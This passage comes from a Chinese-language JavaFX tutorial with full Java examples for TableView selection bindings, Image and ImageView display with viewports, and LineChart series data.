<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TableView&lt;Item&gt; tblItems = <span class="keyword">new</span> <span class="title class_">TableView</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">TableColumn&lt;Item, String&gt; colSKU = <span class="keyword">new</span> <span class="title class_">TableColumn</span>&lt;&gt;(<span class="string">&quot;SKU&quot;</span>);</span><br><span class="line">TableColumn&lt;Item, String&gt; colDescr = <span class="keyword">new</span> <span class="title class_">TableColumn</span>&lt;&gt;(<span class="string">&quot;Item&quot;</span>);</span><br><span class="line">TableColumn&lt;Item, Float&gt; colPrice = <span class="keyword">new</span> <span class="title class_">TableColumn</span>&lt;&gt;(<span class="string">&quot;Price&quot;</span>);</span><br><span class="line">TableColumn&lt;Item, Boolean&gt; colTaxable = <span class="keyword">new</span> <span class="title class_">TableColumn</span>&lt;&gt;(<span class="string">&quot;Tax&quot;</span>);</span><br><span class="line"></span><br><span class="line">tblItems.getColumns().addAll(</span><br><span class="line">    colSKU, colDescr, colPrice, colTaxable</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>向<code>TableView</code>添加模型项是通过向基础集合添加项来完成的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">tblItems.getItems().addAll(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Item</span>(<span class="string">&quot;KBD-0455892&quot;</span>, <span class="string">&quot;Mechanical Keyboard&quot;</span>, <span class="number">100.0f</span>, <span class="literal">true</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Item</span>( <span class="string">&quot;145256&quot;</span>, <span class="string">&quot;Product Docs&quot;</span>, <span class="number">0.0f</span>, <span class="literal">false</span> ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Item</span>( <span class="string">&quot;OR-198975&quot;</span>, <span class="string">&quot;O-Ring (100)&quot;</span>, <span class="number">10.0f</span>, <span class="literal">true</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>此时，已配置<code>TableView</code>并添加了测试数据。 但是，如果您要查看该程序，则会看到三个空行。 这是因为JavaFX缺少POJO和TableColumns之间的链接。 使用cellValueFactory将该链接添加到TableColumns。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">colSKU.setCellValueFactory( <span class="keyword">new</span> <span class="title class_">PropertyValueFactory</span>&lt;&gt;(<span class="string">&quot;sku&quot;</span>) );</span><br><span class="line">colDescr.setCellValueFactory( <span class="keyword">new</span> <span class="title class_">PropertyValueFactory</span>&lt;&gt;(<span class="string">&quot;descr&quot;</span>) );</span><br><span class="line">colPrice.setCellValueFactory( <span class="keyword">new</span> <span class="title class_">PropertyValueFactory</span>&lt;&gt;(<span class="string">&quot;price&quot;</span>) );</span><br><span class="line">colTaxable.setCellValueFactory( <span class="keyword">new</span> <span class="title class_">PropertyValueFactory</span>&lt;&gt;(<span class="string">&quot;taxable&quot;</span>) );</span><br></pre></td></tr></table></figure>
<p>此时查看程序将在相应的列中显示数据。</p>
<h3 id="Selection"><a href="#Selection" class="headerlink" title="Selection"></a>Selection</h3><p>要检索<code>TableView</code>中的选定项，请使用单独的selectionModel对象。 调用tblItems.getSelectionModel（）返回一个包含属性”selectedItem”的对象。 这可以在一个方法中检索和使用，比如调出一个编辑细节屏幕。 或者，getSelectionModel（）可以返回绑定表达式的JavaFX属性”selectedItemProperty”。<br>在演示应用中，两个参数绑定到<code>TableView</code>的selectionModel。 如果没有绑定，您可以添加侦听器来检查选择并在Button上进行类似setDisabled（）的调用。 在<code>TableView</code>选择之前，您还需要初始化逻辑来处理没有选择的情况。 绑定语法在声明性语句中表达此逻辑，该语句可以在一行中处理侦听器和初始化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">btnInventory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Inventory&quot;</span>);</span><br><span class="line"><span class="type">Button</span> <span class="variable">btnCalcTax</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Tax&quot;</span>);</span><br><span class="line"></span><br><span class="line">btnInventory.disableProperty().bind(</span><br><span class="line">    tblItems.getSelectionModel().selectedItemProperty().isNull()</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>如果没有选择任何项目，btnInventory禁用属性将为true（islogy（））。 当屏幕首次显示时，不进行任何选择，<code>Button</code>被禁用。 一旦做出任何选择，btnInventory将被启用（disable&#x3D;false）。</p>
<p>btnCalcTax逻辑稍微复杂一些。 btnCalcTax在没有选择时也被禁用。 但是，btnCalcTax也会考虑selectedItem的内容。 复合绑定或（）用于连接这两个条件。 和前面一样，有一个iscurry（）表达式表示没有选择。 Bindings.select（）检查Item.taxable的值。 一个真实的应税项目将启用btnCalcTax，而一个虚假的项目将禁用<code>Button</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">btnCalcTax.disableProperty().bind(</span><br><span class="line">    tblItems.getSelectionModel().selectedItemProperty().isNull().or(</span><br><span class="line">            Bindings.select(</span><br><span class="line">                tblItems.getSelectionModel().selectedItemProperty(),</span><br><span class="line">                <span class="string">&quot;taxable&quot;</span></span><br><span class="line">            ).isEqualTo(<span class="literal">false</span>)</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p><code>Bindings.select（）</code>是从对象中提取字段的机制。 selectedItemProperty（）是更改的selectedItem，“taxable”是指向taxable字段的single-hop路径。<br>这个例子展示了如何基于POJO设置<code>TableView</code>。 它还提供了一对功能强大的绑定表达式，允许您链接相关控件，而无需编写额外的侦听器和初始化代码。 <code>TableView</code>是JavaFX业务应用程序开发人员不可或缺的控件。 它将是显示结构化项目列表的最佳和最熟悉的控件。</p>
<h3 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.tableview;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.beans.binding.Bindings;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Insets;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.Button;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.TableColumn;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.TableView;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.cell.PropertyValueFactory;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.HBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.Priority;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.VBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TableSelectApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        TableView&lt;Item&gt; tblItems = <span class="keyword">new</span> <span class="title class_">TableView</span>&lt;&gt;();  </span><br><span class="line">        tblItems.setColumnResizePolicy(TableView.CONSTRAINED_RESIZE_POLICY);  </span><br><span class="line">  </span><br><span class="line">        VBox.setVgrow(tblItems, Priority.ALWAYS );  </span><br><span class="line">  </span><br><span class="line">        TableColumn&lt;Item, String&gt; colSKU = <span class="keyword">new</span> <span class="title class_">TableColumn</span>&lt;&gt;(<span class="string">&quot;SKU&quot;</span>);  </span><br><span class="line">        TableColumn&lt;Item, String&gt; colDescr = <span class="keyword">new</span> <span class="title class_">TableColumn</span>&lt;&gt;(<span class="string">&quot;Item&quot;</span>);  </span><br><span class="line">        TableColumn&lt;Item, Float&gt; colPrice = <span class="keyword">new</span> <span class="title class_">TableColumn</span>&lt;&gt;(<span class="string">&quot;Price&quot;</span>);  </span><br><span class="line">        TableColumn&lt;Item, Boolean&gt; colTaxable = <span class="keyword">new</span> <span class="title class_">TableColumn</span>&lt;&gt;(<span class="string">&quot;Tax&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        colSKU.setCellValueFactory( <span class="keyword">new</span> <span class="title class_">PropertyValueFactory</span>&lt;&gt;(<span class="string">&quot;sku&quot;</span>) );  </span><br><span class="line">        colDescr.setCellValueFactory( <span class="keyword">new</span> <span class="title class_">PropertyValueFactory</span>&lt;&gt;(<span class="string">&quot;descr&quot;</span>) );  </span><br><span class="line">        colPrice.setCellValueFactory( <span class="keyword">new</span> <span class="title class_">PropertyValueFactory</span>&lt;&gt;(<span class="string">&quot;price&quot;</span>) );  </span><br><span class="line">        colTaxable.setCellValueFactory( <span class="keyword">new</span> <span class="title class_">PropertyValueFactory</span>&lt;&gt;(<span class="string">&quot;taxable&quot;</span>) );  </span><br><span class="line">  </span><br><span class="line">        tblItems.getColumns().addAll(  </span><br><span class="line">            colSKU, colDescr, colPrice, colTaxable  </span><br><span class="line">        );  </span><br><span class="line">  </span><br><span class="line">        tblItems.getItems().addAll(  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Item</span>(<span class="string">&quot;KBD-0455892&quot;</span>, <span class="string">&quot;Mechanical Keyboard&quot;</span>, <span class="number">100.0f</span>, <span class="literal">true</span>),  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Item</span>( <span class="string">&quot;145256&quot;</span>, <span class="string">&quot;Product Docs&quot;</span>, <span class="number">0.0f</span>, <span class="literal">false</span> ),  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Item</span>( <span class="string">&quot;OR-198975&quot;</span>, <span class="string">&quot;O-Ring (100)&quot;</span>, <span class="number">10.0f</span>, <span class="literal">true</span>),  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Item</span>( <span class="string">&quot;S-123456&quot;</span>, <span class="string">&quot;Screwdriver&quot;</span>, <span class="number">5.0f</span>, <span class="literal">true</span>)  </span><br><span class="line">        );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">btnInventory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Inventory&quot;</span>);  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">btnCalcTax</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Tax&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        btnInventory.disableProperty().bind(  </span><br><span class="line">            tblItems.getSelectionModel().selectedItemProperty().isNull()  </span><br><span class="line">        );  </span><br><span class="line">  </span><br><span class="line">        btnCalcTax.disableProperty().bind(  </span><br><span class="line">            tblItems.getSelectionModel().selectedItemProperty().isNull().or(  </span><br><span class="line">                    Bindings.select(  </span><br><span class="line">                        tblItems.getSelectionModel().selectedItemProperty(),  </span><br><span class="line">                        <span class="string">&quot;taxable&quot;</span>  </span><br><span class="line">                    ).isEqualTo(<span class="literal">false</span>)  </span><br><span class="line">            )  </span><br><span class="line">        );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HBox</span> <span class="variable">buttonHBox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HBox</span>( btnInventory, btnCalcTax );  </span><br><span class="line">        buttonHBox.setSpacing( <span class="number">8</span> );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>( tblItems, buttonHBox );  </span><br><span class="line">        vbox.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10</span>) );  </span><br><span class="line">        vbox.setSpacing( <span class="number">10</span> );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(vbox);  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;TableSelectApp&quot;</span>);  </span><br><span class="line">        primaryStage.setScene( scene );  </span><br><span class="line">        primaryStage.setHeight( <span class="number">376</span> );  </span><br><span class="line">        primaryStage.setWidth( <span class="number">667</span> );  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下：<br><img src="/image/Pasted image 20240430170905.png" alt="20240430170905.png" /></p>
<h2 id="ImageView"><a href="#ImageView" class="headerlink" title="ImageView"></a>ImageView</h2><p>JavaFX提供了<code>Image</code>和<code>ImageView</code>类来显示BMP、GIF、JPEG和PNG图形图像。 Image是一个保存图像字节和可选缩放信息的类。 Image对象由后台线程加载，Image类提供与加载操作交互的方法。 Image对象独立于ImageView用于创建光标和应用图标。<br>ImageView是一个JavaFX<code>Node</code>，它包含一个Image对象。 ImageView使图像在整个框架中可用。 ImageView可以单独添加到容器中，也可以与其他UI控件一起添加。 例如，可以通过设置标签的图形属性将图像添加到<code>Label</code>。<br>图像也可以使用JavaFX CSS显示和操作。</p>
<h3 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h3><p>Image类提供了构造函数，用于从图像文件维度或转换后的对象构建Image对象。 这三个构造函数调用分别创建了用于右上、左下和右下图块的Image对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ImageApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">IMAGE_LOC</span> <span class="operator">=</span> <span class="string">&quot;images/keyboard.jpg&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Image</span> <span class="variable">image2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Image</span>(IMAGE_LOC, <span class="number">360.0d</span>, <span class="number">360.0d</span>, <span class="literal">true</span>, <span class="literal">true</span> );</span><br><span class="line">        <span class="type">Image</span> <span class="variable">image3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Image</span>(IMAGE_LOC, <span class="number">360.0d</span>, <span class="number">360.0d</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">Image</span> <span class="variable">image4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Image</span>(IMAGE_LOC);</span><br></pre></td></tr></table></figure>
<p>传入Image构造函数的所有形式的String URL都是相对于类路径的。 也可以使用绝对URL，例如“<a href="https://www.bekwam.com/images/bekwam_logo_hdr_rounded.png%E2%80%9C%E3%80%82">https://www.bekwam.com/images/bekwam_logo_hdr_rounded.png“。</a> 请注意，绝对URL不会抛出一个错误，如果他们的资源没有找到。<br>图像2和图像3指定尺寸，形成比原始图像的矩形大的正方形。 image2将保留纵横比（“true”）。 image3的构造函数不保留纵横比，因此会显示为拉伸。</p>
<h3 id="ImageView-1"><a href="#ImageView-1" class="headerlink" title="ImageView"></a>ImageView</h3><p>ImageView是一个Node容器，允许在JavaFX容器和UI控件中使用Image对象。 在左上角的图像中，使用了一个简短的ImageView格式，它只传递图像URL。 它将荣誉原始尺寸，并且不需要额外的Image对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ImageView</span> <span class="variable">iv1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImageView</span>(IMAGE_LOC);</span><br><span class="line"></span><br><span class="line"><span class="type">ImageView</span> <span class="variable">iv2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImageView</span>(image2);</span><br><span class="line"><span class="type">ImageView</span> <span class="variable">iv3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImageView</span>(image3);</span><br><span class="line"><span class="type">ImageView</span> <span class="variable">iv4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImageView</span>(image4);</span><br><span class="line"></span><br><span class="line">iv4.setPreserveRatio(<span class="literal">true</span>);</span><br><span class="line">iv4.setFitHeight(<span class="number">360</span>);</span><br><span class="line">iv4.setFitWidth(<span class="number">360</span>);</span><br><span class="line"><span class="type">Rectangle2D</span> <span class="variable">viewportRect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Rectangle2D</span>(<span class="number">20</span>, <span class="number">50</span>, <span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">iv4.setViewport(viewportRect);</span><br></pre></td></tr></table></figure>
<p>IV3和IV3基于图像2和图像3对象。 回想一下，这些对象产生了适合正方形容器的变换图像。<br>此外，调整了iv4的视口。 Viewport控制ImageView的可见部分。 在这种情况下，视口被定义为图像的100x100部分，左移20个像素，上移50个像素。<br>本节演示了Image和ImageView类，它们用于在容器或其他UI控件中显示图像。 这些类定义图像的缩放行为，并可与Rectangle2D Viewport一起使用，以给予额外的图像显示自定义。</p>
<h3 id="完整代码-2"><a href="#完整代码-2" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.imageview;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Rectangle2D;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.image.Image;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.image.ImageView;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.TilePane;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ImageApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">IMAGE_LOC</span> <span class="operator">=</span> <span class="string">&quot;https://img1.baidu.com/it/u=466865769,2215436347&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=660&amp;h=440&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Image</span> <span class="variable">image2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Image</span>(IMAGE_LOC, <span class="number">360.0d</span>, <span class="number">360.0d</span>, <span class="literal">true</span>, <span class="literal">true</span> );  </span><br><span class="line">        <span class="type">Image</span> <span class="variable">image3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Image</span>(IMAGE_LOC, <span class="number">360.0d</span>, <span class="number">360.0d</span>, <span class="literal">false</span>, <span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Image</span> <span class="variable">image4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Image</span>(IMAGE_LOC);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ImageView</span> <span class="variable">iv1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImageView</span>(IMAGE_LOC);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ImageView</span> <span class="variable">iv2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImageView</span>(image2);  </span><br><span class="line">        <span class="type">ImageView</span> <span class="variable">iv3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImageView</span>(image3);  </span><br><span class="line">        <span class="type">ImageView</span> <span class="variable">iv4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ImageView</span>(image4);  </span><br><span class="line">  </span><br><span class="line">        iv4.setPreserveRatio(<span class="literal">true</span>);  </span><br><span class="line">        iv4.setFitHeight(<span class="number">360</span>);  </span><br><span class="line">        iv4.setFitWidth(<span class="number">360</span>);  </span><br><span class="line">        <span class="type">Rectangle2D</span> <span class="variable">viewportRect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Rectangle2D</span>(<span class="number">20</span>, <span class="number">50</span>, <span class="number">100</span>, <span class="number">100</span>);  </span><br><span class="line">        iv4.setViewport(viewportRect);  </span><br><span class="line">          </span><br><span class="line">        <span class="type">TilePane</span> <span class="variable">tiles</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TilePane</span>(iv1, iv2, iv3, iv4);  </span><br><span class="line">        tiles.setPrefColumns(<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(tiles);  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setTitle( <span class="string">&quot;ImageApp&quot;</span> );  </span><br><span class="line">        primaryStage.setScene( scene );  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下：<br><img src="/image/Pasted image 20240430181851.png" alt="20240430181851.png" /></p>
<h2 id="LineChart"><a href="#LineChart" class="headerlink" title="LineChart"></a>LineChart</h2><p>虽然您可以在<code>Line</code>上使用<code>Canvas</code>绘制图形，但JavaFX的<code>LineChart</code>使图形更容易。 除了自定义轴图例等标准图表组件外，LineChart还封装了图形的源数据。 与所有JavaFX控件一样，LineChart允许您使用CSS来设置图形的样式。</p>
<h3 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h3><p>LineChart包含一个用于管理数据的API。 数据点被分组为系列。 这个例子使用了一个系列。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LineChartApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        XYChart.Series&lt;Double, Double&gt; series = <span class="keyword">new</span> <span class="title class_">XYChart</span>.Series&lt;&gt;();</span><br><span class="line">        series.getData().add( <span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;(<span class="number">0.0</span>,<span class="number">0.0</span>));</span><br><span class="line">        series.getData().add( <span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;(<span class="number">0.7</span>,<span class="number">0.5</span>));</span><br><span class="line">        series.getData().add( <span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;(<span class="number">1.0</span>,<span class="number">0.632</span>));</span><br><span class="line">        series.getData().add( <span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;(<span class="number">2.0</span>,<span class="number">0.865</span>));</span><br><span class="line">        series.getData().add( <span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;(<span class="number">3.0</span>,<span class="number">0.95</span>));</span><br><span class="line">        series.getData().add( <span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;( <span class="number">4.0</span>, <span class="number">0.982</span> ));</span><br><span class="line">        series.getData().add( <span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;( <span class="number">5.0</span>, <span class="number">0.993</span> ));</span><br></pre></td></tr></table></figure>
<p>每个数据点都是一个被添加到<code>XYChart.Data</code>容器中的<code>XYChart.Series</code>对象。 若要显示不同系列的比较，请创建其他XYChart.Series对象。 这些将由LineChart呈现为不同的颜色。</p>
<h3 id="图表"><a href="#图表" class="headerlink" title="图表"></a>图表</h3><p>LineChart对象是用Axis对象创建的。 第一个Axis参数用于X轴。每个轴对象都包含一个可选标签：时间常数、电压（Vs）。 接下来的两个数值参数给予下限和上限。 最后一个参数设置步长增量。 另一种形式的LineChart构造函数（本示例中未使用）接受数据。 本例对LineChart的数据字段进行了显式的add（）调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">LineChart</span> <span class="variable">lc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LineChart</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">NumberAxis</span>(<span class="string">&quot;Time Constant&quot;</span>, <span class="number">0.0</span>, <span class="number">5.0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">NumberAxis</span>(<span class="string">&quot;Voltage (Vs)&quot;</span>, <span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">0.1</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">lc.getData().add( series );</span><br></pre></td></tr></table></figure>
<p>LineChart可以使用setTitle（）自定义标题，使用setStyle（）自定义单个样式。 为了保持一致性，最好使用样式表，这样就可以在一组折线图中应用单个样式定义。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lc.setTitle(<span class="string">&quot;RC Charging&quot;</span>);</span><br><span class="line">lc.setStyle(<span class="string">&quot;-fx-background-color: lightgray&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>还有许多其他属性可以设置来配置折线图。 setLegendVisible（）删除系列标识符，因为此图中只有一个系列。 setRightSymbols（）删除每个数据点上的图形，这些数据点在图形的原点和端点处被裁剪。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lc.setCreateSymbols(<span class="literal">false</span>);</span><br><span class="line">lc.setLegendVisible(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>对于适度的报告需求，JavaFX提供了像LineChart这样的类来将多个系列的数据点绘制成一个图。 LineChart对象是高度可定制的，可以控制图例、线条和数据点图标。 此外，CSS样式可用于使这些报告的集合保持一致。</p>
<h3 id="完整代码-3"><a href="#完整代码-3" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.linechart;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.chart.LineChart;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.chart.NumberAxis;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.chart.XYChart;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.VBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LineChartApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        XYChart.Series&lt;Double, Double&gt; series = <span class="keyword">new</span> <span class="title class_">XYChart</span>.Series&lt;&gt;();  </span><br><span class="line">        series.getData().add(<span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;(<span class="number">0.0</span>,<span class="number">0.0</span>));  </span><br><span class="line">        series.getData().add(<span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;(<span class="number">0.7</span>,<span class="number">0.5</span>));  </span><br><span class="line">        series.getData().add(<span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;(<span class="number">1.0</span>,<span class="number">0.632</span>));  </span><br><span class="line">        series.getData().add(<span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;(<span class="number">2.0</span>,<span class="number">0.865</span>));  </span><br><span class="line">        series.getData().add(<span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;(<span class="number">3.0</span>,<span class="number">0.95</span>));  </span><br><span class="line">        series.getData().add(<span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;(<span class="number">4.0</span>, <span class="number">0.982</span>));  </span><br><span class="line">        series.getData().add(<span class="keyword">new</span> <span class="title class_">XYChart</span>.Data&lt;&gt;(<span class="number">5.0</span>, <span class="number">0.993</span>));  </span><br><span class="line">  </span><br><span class="line">        <span class="type">LineChart</span> <span class="variable">lc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LineChart</span>(  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">NumberAxis</span>(<span class="string">&quot;Time Constant&quot;</span>, <span class="number">0.0</span>, <span class="number">5.0</span>, <span class="number">1</span>),  